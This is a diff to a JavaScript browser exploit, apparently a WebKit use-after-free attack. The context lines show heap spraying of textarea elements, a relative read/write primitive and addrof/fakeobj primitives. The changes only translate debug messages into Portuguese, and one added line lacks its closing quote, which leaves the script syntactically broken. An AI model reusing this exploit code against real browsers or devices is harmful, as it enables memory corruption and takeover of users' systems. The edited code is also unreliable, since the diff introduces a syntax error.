@@ -57,7 +57,7 @@ function setupRW() {
 	for (let i = 0; i < g_arr_ab_3.length; i++) {
 		if (g_arr_ab_3[i].length > 0xff) {
 			g_relative_rw = g_arr_ab_3[i];
-			debug_log("[+] Succesfully got a relative R/W");
+			debug_log("[+] Obteve com sucesso um R/W relativo);
 			break;
 		}
 	}
@@ -120,7 +120,7 @@ function setupRW() {
 	g_jsview_butterfly = new Int64(bf);
 	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337")))
 		die("[!] Failed to setup addrof/fakeobj primitives");
-	debug_log("Exploit loaded with succes !");
+	debug_log("Exploit carregado com sucesso!!!");
 
 	/* Getting code execution */
 	/* ... */
@@ -475,7 +475,7 @@ function prepareUAF() {
 
 /* HTMLElement spray */
 function sprayHTMLTextArea() {
-	debug_log("PAYLODE WEBRTE LOADING ...");
+	debug_log("CARREGANDO O WEBRTE...");
 
 	let textarea_div_elem = document.createElement("div");
 	document.body.appendChild(textarea_div_elem);
